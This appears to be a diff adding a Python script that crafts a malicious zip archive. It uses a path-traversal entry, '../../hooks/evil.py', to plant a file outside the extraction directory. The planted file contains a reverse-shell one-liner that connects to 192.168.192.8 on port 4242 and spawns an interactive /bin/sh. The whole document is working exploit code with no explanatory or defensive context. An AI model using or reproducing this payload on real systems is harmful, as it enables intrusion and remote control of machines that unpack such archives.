@@ -1,0 +1,8 @@
+import zipfile,json
+
+payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.192.8",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
+
+with zipfile.ZipFile("evil.zip", "w") as z:
+	z.writestr("shell.json", json.dumps({"name": "evil", "assets": ["sample.png"]}))
+	z.writestr("sample.png", b"\x89PNG\r\n\x1a\n")
+	z.writestr("../../hooks/evil.py", payload)
